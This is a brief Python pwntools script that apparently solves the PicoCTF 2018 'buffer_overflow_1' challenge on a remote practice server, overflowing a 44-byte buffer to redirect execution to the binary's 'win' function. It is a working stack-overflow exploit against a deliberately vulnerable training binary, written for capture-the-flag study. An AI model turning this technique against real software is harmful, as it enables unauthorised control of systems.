from pwn import *


def PicoCTF_2018_buffer_overflow_1(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/PicoCTF_2018_buffer_overflow_1'):
    print('PicoCTF_2018_buffer_overflow_1 start')
    context(log_level='debug', arch='i386', os='linux')
    target = remote('node4.buuoj.cn', 27256)
    target_elf = ELF(file_name)

    win_addr = p32(target_elf.symbols['win'])

    payload = b'a' * 44
    payload += win_addr

    target.sendlineafter('Please enter your string: ', payload)
    print(target.recvline())
    print(target.recvline())
    print("\n%s\n" % target.recvline())
    print('PicoCTF_2018_buffer_overflow_1 end')


if __name__ == '__main__':
    PicoCTF_2018_buffer_overflow_1()
